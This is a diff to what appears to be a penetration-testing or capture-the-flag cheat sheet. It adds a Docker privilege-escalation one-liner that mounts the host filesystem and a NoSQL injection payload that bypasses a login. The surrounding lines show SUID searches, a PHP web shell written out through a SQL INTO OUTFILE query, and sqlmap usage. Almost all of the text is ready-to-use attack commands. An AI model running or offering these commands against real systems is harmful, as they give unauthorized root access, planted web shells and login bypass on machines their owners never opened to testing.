@@ -160,6 +160,9 @@ find / -perm -4000 2>/dev/null
 From user to root (Privilege Escalation)
 find / -perm +6000 2> /dev/null
 
+# Docker (priv, escalation, root)
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
 Read root files with error messages (unstable):
 command_you_can_run --var-in-there="/root/flag.txt"
 
@@ -253,6 +256,9 @@ select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/she
 # SQLMAP
 Save full request with header and body in request.txt:
 sqlmap -R request.txt --batch --random-refer
+
+# nosql injection (SQL):
+username=admin&password[$ne]=admin
 
 # WPSCAN
 enumerate plugins, themes etc
